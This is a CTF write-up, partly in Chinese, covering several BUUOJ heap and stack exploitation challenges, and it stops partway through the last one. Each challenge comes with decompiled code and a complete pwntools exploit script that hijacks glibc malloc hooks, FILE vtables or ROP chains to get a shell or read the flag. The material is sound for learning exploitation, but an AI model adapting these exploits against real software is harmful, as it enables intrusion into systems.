# Challenges 100 Week 7



# Challenges_100-Week_7

|           Challenges           |                      Tricks                      |
| :----------------------------: | :----------------------------------------------: |
| BUU-houseoforange_hitcon_2016  |                `house_of_orange`                 |
|    BUU-npuctf2020-easyheap     |          `off-by-one`+`ovlapping chunk`          |
| BUU-hitcon2018_children_tcache |         `off-by-null`+`tcache_psisoning`         |
|      BUU-vn2020-easyTHeap      |    `tcache_psisoning`+`hacking tcache struct`    |
|     BUU-vn2020-simpleheap      | `off-by-one`+`ovlapping chunk`+`house_of_spirit` |
|       BUU-vn2020-warmup        |                      `orw`                       |
|    BUU-hitcontraining-stkof    |                     `unlink`                     |

<!--more-->

# BUU-houseoforange_hitcon_2016

## checksec

```shell
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
```

## IDA

**add**

```c
int add()
{
  unsigned int size; // [rsp+8h] [rbp-18h]
  int size_4; // [rsp+Ch] [rbp-14h]
  _QWORD *v3; // [rsp+10h] [rbp-10h]
  _DWORD *v4; // [rsp+18h] [rbp-8h]

  if ( add_count > 3u )
  {
    puts("Too many house");
    exit(1);
  }
  v3 = malloc(0x10uLL);
  printf("Length of name :");
  size = read_num();
  if ( size > 0x1000 )
    size = 0x1000;
  v3[1] = malloc(size);
  if ( !v3[1] )
  {
    puts("Malloc error !!!");
    exit(1);
  }
  printf("Name :");
  read_data(v3[1], size);
  v4 = calloc(1uLL, 8uLL);
  printf("Price of Orange:");
  *v4 = read_num();
  color_list();
  printf("Color of Orange:");
  size_4 = read_num();
  if ( size_4 != 56746 && (size_4 <= 0 || size_4 > 7) )
  {
    puts("No such color");
    exit(1);
  }
  if ( size_4 == 56746 )
    v4[1] = 56746;
  else
    v4[1] = size_4 + 30;
  *v3 = v4;
  color = v3;
  ++add_count;
  return puts("Finish");
}
```

**up**

```c
int up()
{
  _DWORD *v1; // rbx
  unsigned int v2; // [rsp+8h] [rbp-18h]
  int v3; // [rsp+Ch] [rbp-14h]

  if ( up_counter > 2u )
    return puts("You can't upgrade more");
  if ( !color )
    return puts("No such house !");
  printf("Length of name :");
  v2 = read_num();
  if ( v2 > 0x1000 )
    v2 = 4096;
  printf("Name:");
  read_data(color[1], v2);
  printf("Price of Orange: ");
  v1 = (_DWORD *)*color;
  *v1 = read_num();
  color_list();
  printf("Color of Orange: ");
  v3 = read_num();
  if ( v3 != 56746 && (v3 <= 0 || v3 > 7) )
  {
    puts("No such color");
    exit(1);
  }
  if ( v3 == 56746 )
    *(_DWORD *)(*color + 4LL) = 56746;
  else
    *(_DWORD *)(*color + 4LL) = v3 + 30;
  ++up_counter;
  return puts("Finish");
}
```

**see**

```c
int see()
{
  int v0; // eax
  int result; // eax
  int v2; // eax

  if ( !color )
    return puts("No such house !");
  if ( *(_DWORD *)(*color + 4LL) == 56746 )
  {
    printf("Name of house : %s\n", (const char *)color[1]);
    printf("Price of orange : %d\n", *(unsigned int *)*color);
    v0 = rand();
    result = printf("\x1B[01;38;5;214m%s\x1B[0m\n", *((const char **)&unk_203080 + v0 % 8));
  }
  else
  {
    if ( *(int *)(*color + 4LL) <= 30 || *(int *)(*color + 4LL) > 37 )
    {
      puts("Color corruption!");
      exit(1);
    }
    printf("Name of house : %s\n", (const char *)color[1]);
    printf("Price of orange : %d\n", *(unsigned int *)*color);
    v2 = rand();
    result = printf("\x1B[%dm%s\x1B[0m\n", *(unsigned int *)(*color + 4LL), *((const char **)&unk_203080 + v2 % 8));
  }
  return result;
}
```

漏洞点为：在`up`中有溢出。

如题，使用`house_of_orange`，本质上`house_of_orange`中使用了`unsortedbin attack`将伪造的`fake FILE`链入`_IO_list_all`中，实现控制程序执行流。

## exp

```python
from pwn import *
from LibcSearcher import LibcSearcher
from struct import pack
leak = lambda name,addr: log.success('{0} addr ---> {1}'.format(name, hex(addr)))
context.arch="amd64"

local=0
binary='./houseoforange_hitcon_2016'
#gdb.attach(sh)
if local:
	#context.log_level="DEBUG"
	sh=process(binary)
else:
	sh=remote('node3.buuoj.cn',27919)

elf = ELF(binary,checksec=False)
#libc = ELF('./libc-2.27.so',checksec=False)
vtable_offset=0xd8
_IO_write_base=0x20
_IO_write_ptr=0x28


def add(length, name, price, color):
    sh.recvuntil('choice : ')
    sh.sendline('1')
    sh.sendlineafter('Length of name :', str(length))
    sh.sendafter('Name :', str(name))
    sh.sendafter('Price of Orange:', str(price))
    sh.sendafter('Color of Orange:', str(color))

def see():
    sh.recvuntil('choice : ')
    sh.sendline('2')

def up(length, name, price, color):
    sh.recvuntil('choice : ')
    sh.sendline('3')
    sh.sendlineafter('Length of name :', str(length))
    sh.sendafter('Name:', str(name))
    sh.sendafter('Price of Orange:', str(price))
    sh.sendafter('Color of Orange:', str(color))
#get a free chunk
add(0x80,'a'*8,111,0xddaa)

up(0x450,'\x00'*0x80+p64(0)+p64(0x21)+'\x00'*0x10+p64(0)+p64(0xf31),222,0xddaa)
add(0x1000,'c'*8,333,0xddaa)
add(0x400,'a'*8,444,0xddaa)
#fake vtable
#gdb.attach(sh)
see()

main_arena=u64(sh.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
malloc_hook = main_arena-1640-0x10
libc = LibcSearcher('__malloc_hook',malloc_hook)
libcbase = malloc_hook-libc.dump('__malloc_hook')
leak('main hook',malloc_hook)
leak('libc base',libcbase)
IO_list_all = libcbase +libc.dump('_IO_list_all')
system=libcbase+libc.dump('system')
leak('IO_list_all',IO_list_all)

up(0x400,'a'*0x10,666,0xddaa)
see()
heapbase = u64(sh.recvuntil('\x56')[-6:].ljust(8,'\x00'))
leak('heap base',heapbase)
vtable=heapbase+0x400+0x20+0x100-0x10

payload = '\x00'*0x408+p64(0x21)+'\x00'*0x10
payload+='/bin/sh\x00'+p64(0x61)
payload+=p64(main_arena)+p64(IO_list_all-0x10)
payload+=p64(0x2)+p64(0x3)+p64(0)*21
payload+=p64(vtable)+p64(0)*3+p64(system)
up(0x1000,payload,666,0xddaa)
#get shell
#gdb.attach(sh)
sh.recvuntil('choice : ')
sh.sendline('1')

sh.interactive()
```

offset

```c
0x0   _flags
0x8   _IO_read_ptr
0x10  _IO_read_end
0x18  _IO_read_base
0x20  _IO_write_base
0x28  _IO_write_ptr
0x30  _IO_write_end
0x38  _IO_buf_base
0x40  _IO_buf_end
0x48  _IO_save_base
0x50  _IO_backup_base
0x58  _IO_save_end
0x60  _markers
0x68  _chain
0x70  _fileno
0x74  _flags2
0x78  _old_offset
0x80  _cur_column
0x82  _vtable_offset
0x83  _shortbuf
0x88  _lock
0x90  _offset
0x98  _codecvt
0xa0  _wide_data
0xa8  _freeres_list
0xb0  _freeres_buf
0xb8  __pad5
0xc0  _mode
0xc4  _unused2
0xd8  vtable
```

```c
void * funcs[] = {
   1 NULL, // "extra word"
   2 NULL, // DUMMY
   3 exit, // finish
   4 NULL, // overflow
   5 NULL, // underflow
   6 NULL, // uflow
   7 NULL, // pbackfail

   8 NULL, // xsputn  #printf
   9 NULL, // xsgetn
   10 NULL, // seekoff
   11 NULL, // seekpos
   12 NULL, // setbuf
   13 NULL, // sync
   14 NULL, // doallocate
   15 NULL, // read
   16 NULL, // write
   17 NULL, // seek
   18 pwn,  // close
   19 NULL, // stat
   20 NULL, // showmanyc
   21 NULL, // imbue
};
```

# BUU-npuctf2020-easyheap

## checksec

```shell
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

## IDA

**create**

```c
unsigned __int64 create()
{
  __int64 v0; // rbx
  int i; // [rsp+4h] [rbp-2Ch]
  size_t size; // [rsp+8h] [rbp-28h]
  char buf[8]; // [rsp+10h] [rbp-20h] BYREF
  unsigned __int64 v5; // [rsp+18h] [rbp-18h]

  v5 = __readfsqword(0x28u);
  for ( i = 0; i <= 9; ++i )
  {
    if ( !*((_QWORD *)&heaparray + i) )
    {
      *((_QWORD *)&heaparray + i) = malloc(0x10uLL);
      if ( !*((_QWORD *)&heaparray + i) )
      {
        puts("Allocate Error");
        exit(1);
      }
      printf("Size of Heap(0x10 or 0x20 only) : ");
      read(0, buf, 8uLL);
      size = atoi(buf);
      if ( size != 24 && size != 56 )
        exit(-1);
      v0 = *((_QWORD *)&heaparray + i);
      *(_QWORD *)(v0 + 8) = malloc(size);
      if ( !*(_QWORD *)(*((_QWORD *)&heaparray + i) + 8LL) )
      {
        puts("Allocate Error");
        exit(2);
      }
      **((_QWORD **)&heaparray + i) = size;
      printf("Content:");
      read_input(*(_QWORD *)(*((_QWORD *)&heaparray + i) + 8LL), size);
      puts("Done!");
      return __readfsqword(0x28u) ^ v5;
    }
  }
  return __readfsqword(0x28u) ^ v5;
}
```

**edit**

```c
unsigned __int64 edit()
{
  int v1; // [rsp+0h] [rbp-10h]
  char buf[4]; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v3; // [rsp+8h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("Index :");
  read(0, buf, 4uLL);
  v1 = atoi(buf);
  if ( v1 < 0 || v1 > 9 )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( *((_QWORD *)&heaparray + v1) )
  {
    printf("Content: ");
    read_input(*(_QWORD *)(*((_QWORD *)&heaparray + v1) + 8LL), **((_QWORD **)&heaparray + v1) + 1LL);
    puts("Done!");
  }
  else
  {
    puts("How Dare you!");
  }
  return __readfsqword(0x28u) ^ v3;
}
```

**show**

```c
unsigned __int64 show()
{
  int v1; // [rsp+0h] [rbp-10h]
  char buf[4]; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v3; // [rsp+8h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("Index :");
  read(0, buf, 4uLL);
  v1 = atoi(buf);
  if ( v1 < 0 || v1 > 9 )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( *((_QWORD *)&heaparray + v1) )
  {
    printf(
      "Size : %ld\nContent : %s\n",
      **((_QWORD **)&heaparray + v1),
      *(const char **)(*((_QWORD *)&heaparray + v1) + 8LL));
    puts("Done!");
  }
  else
  {
    puts("How Dare you!");
  }
  return __readfsqword(0x28u) ^ v3;
}
```

**dele**

```c
unsigned __int64 delete()
{
  int v1; // [rsp+0h] [rbp-10h]
  char buf[4]; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v3; // [rsp+8h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("Index :");
  read(0, buf, 4uLL);
  v1 = atoi(buf);
  if ( v1 < 0 || v1 > 9 )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( *((_QWORD *)&heaparray + v1) )
  {
    free(*(void **)(*((_QWORD *)&heaparray + v1) + 8LL));
    free(*((void **)&heaparray + v1));
    *((_QWORD *)&heaparray + v1) = 0LL;
    puts("Done !");
  }
  else
  {
    puts("How Dare you!");
  }
  return __readfsqword(0x28u) ^ v3;
}
```

利用`edit`中的`off-by-one`造成`chunk overlapping`修改指针，从而改写`got`表。

## exp

```python
from pwn import *
from struct import pack
leak = lambda name,addr: log.success('{0} addr ---> {1}'.format(name, hex(addr)))
context.arch="amd64"

local=0
binary='./npuctf_2020_easyheap'
#gdb.attach(sh)
if local:
	context.log_level="DEBUG"
	sh=process(binary)
else:
	sh=remote('node3.buuoj.cn',29293)

elf = ELF(binary,checksec=False)
libc = ELF('./libc-2.27.so',checksec=False)
one=[0x4f2c5,0x4f322,0x10a38c]
puts_got = elf.got['puts']
free_got = elf.got['free']

def add(size, content):
    sh.recvuntil(' :')
    sh.sendline('1')
    sh.sendlineafter(') : ', str(size))
    sh.sendafter('Content:', str(content))

def edit(idx, content):
    sh.recvuntil(' :')
    sh.sendline('2')
    sh.sendlineafter('ndex :', str(idx))
    sh.sendafter('Content:', str(content))

def show(idx):
    sh.recvuntil(' :')
    sh.sendline('3')
    sh.sendlineafter('ndex :', str(idx))

def free(idx):
    sh.recvuntil(' :')
    sh.sendline('4')
    sh.sendlineafter('ndex :', str(idx))

add(0x18,'1'*8) #0
add(0x18,'2'*8) #1
add(0x18,'/bin/sh\x00') #2
edit(0, '\x00'*0x18+'\x41')
free(1)
add(0x38,'4'*8*3+p64(0x21)+p64(0x38)+p64(free_got)) #1
#gdb.attach(sh)
show(1)

free_addr=u64(sh.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
leak('free',free_addr)
libcbase = free_addr-libc.sym['free']
free_hook = libcbase+libc.sym['__free_hook']
system = libcbase+libc.sym['system']
leak('libc base',libcbase)
one_gadget = libcbase+one[2]
edit(1,p64(system))
free(2)

sh.interactive()
```

# BUU-hitcon2018_children_tcache

## checksec

```shell
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
```

## IDA

**add**

```c
unsigned __int64 add()
{
  int i; // [rsp+Ch] [rbp-2034h]
  char *dest; // [rsp+10h] [rbp-2030h]
  unsigned __int64 size; // [rsp+18h] [rbp-2028h]
  char s[8216]; // [rsp+20h] [rbp-2020h] BYREF
  unsigned __int64 v5; // [rsp+2038h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  memset(s, 0, 0x2010uLL);
  for ( i = 0; ; ++i )
  {
    if ( i > 9 )
    {
      puts(":(");
      return __readfsqword(0x28u) ^ v5;
    }
    if ( !heap_array[i] )
      break;
  }
  printf("Size:");
  size = sub_B67();
  if ( size > 0x2000 )
    exit(-2);
  dest = (char *)malloc(size);
  if ( !dest )
    exit(-1);
  printf("Data:");
  sub_BC8(s, (unsigned int)size);
  strcpy(dest, s);                              // off-by-null
  heap_array[i] = dest;
  size_array[i] = size;
  return __readfsqword(0x28u) ^ v5;
}
```

**show**

```c
int show()
{
  __int64 v0; // rax
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  printf("Index:");
  v2 = sub_B67();
  if ( v2 > 9 )
    exit(-3);
  v0 = heap_array[v2];
  if ( v0 )
    LODWORD(v0) = puts((const char *)heap_array[v2]);
  return v0;
}
```

**dele**

```c
int dele()
{
  unsigned __int64 v1; // [rsp+8h] [rbp-8h]

  printf("Index:");
  v1 = sub_B67();
  if ( v1 > 9 )
    exit(-3);
  if ( heap_array[v1] )
  {
    memset((void *)heap_array[v1], 218, size_array[v1]);
    free((void *)heap_array[v1]);
    heap_array[v1] = 0LL;
    size_array[v1] = 0LL;
  }
  return puts(":)");
}
```

漏洞是`off-by-null`，而远程的libc还没有tcache的`double free`的检查。通过`off-by-one`，我们能做到清空下一个chunk的`prev_inuse`位，这点可以导致`overlapping`。

首先，申请三个chunk。chunk_0和chunk_2要是large bin，这样就不会进入tcache中，我们通过chunk_1，清除chunk_2的`prev_inuse`位，并将prev_size域设为`chunk_0+chunk_1`的大小，让chunk_2认为前面有一块巨大的更大的chunk。在做这一步之前，要首先将chunk_0 free掉，不然在后续的free中会出现size与prev_size的不匹配，导致程序退出。

之后free掉chunk_2，此时这三个chunk被合并加入了`unsorted bin`中，然后，申请和最开始chunk_0同样大小的chunk，`unsorted bin`中的chunk被分割，原本的chunk_1+chunk_2被加入`unsorted bin`。注意，这时chunk_1还在被我们使用中，所以可以通过`show`来leak libc。

接着，想办法控制程序执行流。再次，将chunk_1申请回来，这样我们就有两个chunk，指向chunk_1，使用`tcache_psisoning`获得`__malloc_hook`附近的chunk，填入one_gadget，从而get shell。

## exp

```python
from pwn import *
from LibcSearcher import LibcSearcher
from struct import pack
leak = lambda name,addr: log.success('{0} addr ---> {1}'.format(name, hex(addr)))
context.arch="amd64"
local=0
binary='./HITCON_2018_children_tcache'
#gdb.attach(sh)
if local:
    context.log_level="DEBUG"
    sh=process(binary)
else:
	sh=remote('node3.buuoj.cn',25968)

elf = ELF(binary,checksec=False)
#libc = ELF('./libc-2.27.so',checksec=False)
heap_array=0x202060
free_got = elf.got['free']

def add(size, content):
    sh.recvuntil('choice: ')
    sh.sendline('1')
    sh.sendlineafter('Size:', str(size))
    sh.sendlineafter('Data:', str(content))

def show(idx):
    sh.recvuntil('choice: ')
    sh.sendline('2')
    sh.sendlineafter('Index:', str(idx))

def free(idx):
    sh.recvuntil('choice: ')
    sh.sendline('3')
    sh.sendlineafter('Index:', str(idx))

add(0x4f8,'a') #0 0x500
add(0x78,'b')   #1  0x80
add(0x4f8,'c') #2 0x500
add(0x18,'/bin/sh\x00') #3

free(1)
free(0)
#clear chunk_3's prev_inuse bit

for i in range(0,8):
    add((0x78-i),'a'*(0x78-i)) #0 0x80
    free(0)

add(0x78,'b'*0x70+p64(0x580))   #0  0x80

free(2)
add(0x4f8,'c'*0x4f7) #1
#gdb.attach(sh)
show(0)

main_arena = u64(sh.recvuntil('\x7f').ljust(8,'\x00'))-96
malloc_hook = main_arena-0x10
libc=LibcSearcher('__malloc_hook',malloc_hook)
libcbase=malloc_hook-libc.dump('__malloc_hook')
one_gadget = libcbase + 0x4f322
leak('libcbase',libcbase)

add(0x78,'a') #2
free(0)
free(2)
add(0x78,p64(malloc_hook)) #0
add(0x78,p64(malloc_hook)) #2
add(0x78,p64(one_gadget)) #4

sh.recvuntil('choice: ')
sh.sendline('1')
sh.sendlineafter('Size:', str(12))

sh.interactive()
```

注意`strcpy`本身会被'\x00'截断，所以通过循环`off-by-null`的方式修改`prev_size`。

# BUU-vn2020-easyTHeap

## checksec

```shell
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

## IDA

**main**

```c
void __fastcall main(__int64 a1, char **a2, char **a3)
{
  sub_A39(a1, a2, a3);
  puts("Welcome to V&N challange!");
  puts("This's a tcache heap for you.");
  while ( 1 )
  {
    sub_DCF();
    switch ( (unsigned int)sub_9EA() )
    {
      case 1u:
        if ( !add_count )//7
          exit(0);
        add();
        --add_count;
        break;
      case 2u:
        edit();
        break;
      case 3u:
        show();
        break;
      case 4u:
        if ( !free_count )//3
        {
          puts("NoNoNo!");
          exit(0);
        }
        free_();
        --free_count;
        break;
      case 5u:
        exit(0);
      default:
        puts("Please input current choice.");
        break;
    }
  }
}
```

**add**

```c
int add()
{
  int result; // eax
  int v1; // [rsp+8h] [rbp-8h]
  int v2; // [rsp+Ch] [rbp-4h]

  v1 = sub_AB2();
  if ( v1 == -1 )
    return puts("Full");
  printf("size?");
  result = sub_9EA();
  v2 = result;
  if ( result > 0 && result <= 256 )
  {
    qword_202080[v1] = malloc(result);
    if ( !qword_202080[v1] )
    {
      puts("Something Wrong!");
      exit(-1);
    }
    dword_202060[v1] = v2;
    result = puts("Done!");
  }
  return result;
}
```

**show**

```c
int sub_CA4()
{
  int v1; // [rsp+Ch] [rbp-4h]

  printf("idx?");
  v1 = sub_9EA();
  if ( v1 < 0 || v1 > 6 || !*((_QWORD *)&qword_202080 + v1) )
    exit(0);
  puts(*((const char **)&qword_202080 + v1));
  return puts("Done!");
}
```

**edit**

```c
int edit()
{
  int v1; // [rsp+Ch] [rbp-4h]

  printf("idx?");
  v1 = sub_9EA();
  if ( v1 < 0 || v1 > 6 || !qword_202080[v1] )
    exit(0);
  printf("content:");
  read(0, (void *)qword_202080[v1], (unsigned int)dword_202060[v1]);
  return puts("Done!");
}
```

**dele**

```c
int free_()
{
  int v1; // [rsp+Ch] [rbp-4h]

  printf("idx?");
  v1 = sub_9EA();
  if ( v1 < 0 || v1 > 6 || !qword_202080[v1] )
    exit(0);
  free((void *)qword_202080[v1]);
  dword_202060[v1] = 0;
  return puts("Done!");
}
```

严格限制了add次数为7次，free次数为3次。但是没有销毁指针，只是修改了size为0。

在远程的环境中，为glibc-2.27，tcache没有对double free的检测，所以我们可以通过double free泄露堆的基址。`tcache struct`就在堆的最开始，通过计算偏移，修改tcache中chunk的fd指针，将这块内存申请出来，然后修改其count的数量，从而防止之后free的chunk进入tcache。再将这块内存进行free，它会进入`unsorted bin`中从而leak libc。

这时再进行申请，系统会将`tcache struct`进行分割，返回给我们，我们再修改其`next`指针，指向`malloc_hook`附近的`fake chunk`从而覆写get shell。

## exp

```python
from pwn import *
from LibcSearcher import LibcSearcher
from struct import pack
leak = lambda name,addr: log.success('{0} addr ---> {1}'.format(name, hex(addr)))
#context.log_level="DEBUG"
#context.arch="amd64"

local=0
binary='./vn_pwn_easyTHeap'

if local:
	sh=process(binary)
else:
	sh=remote('node3.buuoj.cn',26965)

elf = ELF(binary,checksec=False)
libc = ELF('./libc-2.27.so',checksec=False)
#gdb.attach(sh)

def add(size):
    sh.sendlineafter(': ','1')
    sh.sendlineafter('?',str(size))
    
def edit(idx,content):
    sh.sendlineafter(': ','2')
    sh.sendlineafter('?',str(idx))
    sh.sendafter('content:',str(content))
    
def show(idx):
	sh.sendlineafter(': ','3')
 	sh.sendlineafter('?',str(idx))
  
def free(idx):
	sh.sendlineafter(': ','4')
 	sh.sendlineafter('?',str(idx))
 
one = [0x4f2c5,0x4f322,0x10a38c]
add(0x50) #0
free(0)
free(0)
#gdb.attach(sh)
show(0)
heap_base = u64(sh.recvuntil('\n', drop = True).ljust(8, '\x00'))-0x250
leak('heap base',heap_base)
add(0x50) #1
edit(1,p64(heap_base))
add(0x50) #2
add(0x50) #3
edit(3,'A'*0x28)
free(3)
show(3)

main_arena = u64(sh.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
libcbase = main_arena-libc.sym['__malloc_hook']-0x70
fake_chunk = libcbase+libc.sym['__malloc_hook']-0x13
realloc =libcbase+libc.sym['__libc_realloc']
one_gadget = libcbase+one[1]
leak('libc base',libcbase)

add(0x50) #4 from tcache_struct
edit(4,'\x00'*0x48+p64(fake_chunk))
add(0x20) #5
edit(5,'\x00'*(0x13-8)+p64(one_gadget)+p64(realloc+8))
add(0x10)

sh.interactive()
```

# BUU-vn2020-simpleheap

## checksec

```shell
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

## IDA

**add**

```c
int add()
{
  int result; // eax
  int v1; // [rsp+8h] [rbp-8h]
  int v2; // [rsp+Ch] [rbp-4h]

  v1 = sub_AB2();
  if ( v1 == -1 )
    return puts("Full");
  printf("size?");
  result = choice();
  v2 = result;
  if ( result > 0 && result <= 111 )
  {
    *((_QWORD *)&unk_2020A0 + v1) = malloc(result);
    if ( !*((_QWORD *)&unk_2020A0 + v1) )
    {
      puts("Something Wrong!");
      exit(-1);
    }
    dword_202060[v1] = v2;
    printf("content:");
    read(0, *((void **)&unk_2020A0 + v1), dword_202060[v1]);
    result = puts("Done!");
  }
  return result;
}
```

**edit**

```c
int edit()
{
  int v1; // [rsp+Ch] [rbp-4h]

  printf("idx?");
  v1 = choice();
  if ( v1 < 0 || v1 > 9 || !qword_2020A0[v1] )
    exit(0);
  printf("content:");
  sub_C39(qword_2020A0[v1], dword_202060[v1]);
  return puts("Done!");
}
```

**show**

```c
int show()
{
  int v1; // [rsp+Ch] [rbp-4h]

  printf("idx?");
  v1 = choice();
  if ( v1 < 0 || v1 > 9 || !qword_2020A0[v1] )
    exit(0);
  puts((const char *)qword_2020A0[v1]);
  return puts("Done!");
}
```

**dele**

```c
int dele()
{
  int v1; // [rsp+Ch] [rbp-4h]

  printf("idx?");
  v1 = choice();
  if ( v1 < 0 || v1 > 9 || !qword_2020A0[v1] )
    exit(0);
  free((void *)qword_2020A0[v1]);
  qword_2020A0[v1] = 0LL;
  dword_202060[v1] = 0;
  return puts("Done!");
}
```

**输入函数**

```c
unsigned __int64 __fastcall sub_C39(__int64 a1, int a2)
{
  unsigned __int64 result; // rax
  unsigned int i; // [rsp+1Ch] [rbp-4h]

  for ( i = 0; ; ++i )
  {
    result = i;
    if ( (int)i > a2 )
      break;
    if ( !read(0, (void *)((int)i + a1), 1uLL) )
      exit(0);
    if ( *(_BYTE *)((int)i + a1) == 10 )
    {
      result = (int)i + a1;
      *(_BYTE *)result = 0;
      return result;
    }
  }
  return result;
}
```

唯一的漏洞点就在这个输入函数中，它将跳出循环的条件放在了内部，导致了`off-by-one`，从而可以通过`ovlapping chunk`leak libc，之后再通过修改fd利用`house_of_spirit`，覆写`__malloc_hook`配合`__realloc_hook`实现`get shell`。

## exp

```python
from pwn import *
from LibcSearcher import LibcSearcher
from struct import pack
leak = lambda name,addr: log.success('{0} addr ---> {1}'.format(name, hex(addr)))
#context.log_level="DEBUG"
#context.arch="amd64"

local=0
binary='./vn_pwn_simpleHeap'
#gdb.attach(sh)
if local:
	sh=process(binary)
else:
	sh=remote('node3.buuoj.cn',29656)

elf = ELF(binary,checksec=False)
libc = ELF('./libc-2.23.so')

def add(size,content):
    sh.sendlineafter(': ','1')
    sh.sendlineafter('?',str(size))
    sh.sendafter(':',str(content))
    
def edit(idx,content):
    sh.sendlineafter(': ','2')
    sh.sendlineafter('?',str(idx))
    sh.sendafter(':',str(content))
    
def show(idx):
    sh.sendlineafter(': ','3')
    sh.sendlineafter('?',str(idx))
    
def dele(idx):
    sh.sendlineafter(': ','4')
    sh.sendlineafter('?',str(idx))

one = [0x45216,0x4526a,0xf02a4,0xf1147]
local = [0x45226,0x4527a,0xf0364,0xf1207]

add(0x18,'a'*0x18) #0
add(0x68,'b'*0x18) #1 0x70
add(0x68,'c'*0x18) #2 0x70
add(0x18,'d'*0x18) #3 0x20

edit(0,'\x00'*0x18+'\xe1') 
dele(1)
add(0x68,'a'*8) #1
show(2)

main_arena = u64(sh.recvuntil('\x7f')[-6:].ljust(8,'\x00'))-88
libc_base=main_arena - 0x3C4B20
malloc_hook = libc_base + 0x3c4b10
fake_chunk = malloc_hook -0x23
realloc = libc_base+0x846C0
one_gadget = libc_base + one[1] 

leak('main_arena', main_arena)
leak('malloc_hook',malloc_hook)
leak('fake_chunk', fake_chunk)
leak('libc_base', libc_base)
leak('one gadget',one_gadget)

add(0x68,'\n') #4-->2
dele(2)
edit(4,p64(fake_chunk)+'\n')
add(0x68,'\n')
add(0x68,'\x00'*(0x13-8)+p64(one_gadget)+p64(realloc+0xd))

sh.sendlineafter(': ','1')
sh.sendlineafter('?','10')

sh.interactive()
```

较为常规的一道题目

# BUU-vn2020-warmup

## checksec

```shell
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

## IDA

```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  sub_80A(a1, a2, a3);
  puts("This is a easy challange for you.");
  printf("Here is my gift: 0x%llx\n", &puts);
  sub_84D();//沙箱，禁用write和exceve
  sub_9D3();
  return 0LL;
}

int sub_9D3()
{
  char buf[384]; // [rsp+0h] [rbp-180h] BYREF

  printf("Input something: ");
  read(0, buf, 0x180uLL);
  sub_9A1();
  return puts("Done!");
}

ssize_t sub_9A1()
{
  char buf[112]; // [rsp+0h] [rbp-70h] BYREF

  printf("What's your name?");
  return read(0, buf, 0x80uLL);
}
```

给了我们puts的地址，我们可以以此来确定libc基址。但是由于不能get shell，所以要构造orw的ROP。开启了PIE保护，选择在libc中找gadget，在name处可以溢出，覆盖返回地址和rbp。

注意到，`sub_9A1`的栈应该在`sub_9D3`的下方，且两者是调用关系，`sub_9A1`的buf的栈应该与`sub_9D3`相邻，所以我们只要让栈再ret到`sub_9D3`的buf里就可以，通过覆盖返回地址为`pop_rdi_ret`，最后ret到ROP处。

`open`函数还需要一个`flag`字符串，由于程序的位置是随机的，我们将这个字符串写在栈上，例如`free_hook`

## exp

```python
from pwn import *
from LibcSearcher import LibcSearcher
from struct import pack
leak = lambda name,addr: log.success('{0} addr ---> {1}'.format(name, hex(addr)))
#context.log_level="DEBUG"
#context.arch="amd64"

local=0
binary='./vn_pwn_warmup'
#gdb.attach(sh)
# if local:
# 	sh=process(binary)
# else:
# 	sh=remote('node3.buuoj.cn',27261)

elf = ELF(binary,checksec=False)
while True:
	sh=remote('node3.buuoj.cn',28653)
	sh.recvuntil('gift: ') 
	puts_addr=int(sh.recvuntil('\n'),16)
	libc=ELF("libc6_2.23-0ubuntu10_amd64.so",checksec=False)
	libcbase=puts_addr-libc.symbols['puts']
	leak('libc base',libcbase)

	pop_rdi=libcbase+0x21102
	pop_rsi=libcbase+0x202e8
	pop_rdx=libcbase+0x1b92
	open_addr=libcbase+libc.sym['open']
	free_hook=libcbase+libc.sym['__free_hook']
	read_addr=libcbase+libc.sym['read']
	puts_addr=libcbase+libc.sym['puts']

	payload=p64(0)+p64(pop_rsi)+p64(free_hook)+p64(pop_rdx)+p64(4)+p64(read_addr)
	payload+=p64(pop_rdi)+p64(free_hook)+p64(pop_rsi)+p64(4)+p64(open_addr)
	payload+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(free_hook)+p64(pop_rdx)+p64(0x30)+p64(read_addr)
	payload+=p64(pop_rdi)+p64(free_hook)+p64(puts_addr)
	try:
		sh.sendafter("Input something: ",payload)
		sh.sendafter("What's your name?",'a'* 0x78+p64(pop_rdi))
		sh.send("./flag")
		flag = sh.recv()
		if 'flag' in flag:
			print(flag)
	except:
		sh.close()
		continue
```

# BUU-hitcontraining-stkof

## checksec

```shell
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

## IDA

**add**

```c
__int64 sub_400936()
{
  __int64 size; // [rsp+0h] [rbp-80h]
  char *v2; // [rsp+8h] [rbp-78h]
  char s[104]; // [rsp+10h] [rbp-70h] BYREF
  unsigned __int64 v4; // [rsp+78h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  fgets(s, 16, stdin);
  size = atoll(s);
  v2 = (char *)malloc(size);
  if ( !v2 )
    return 0xFFFFFFFFLL;
  (&::s)[++chunk_count] = v2;
  printf("%d\n", (unsigned int)chunk_count);
  return 0LL;
}
```

**edit**

```c
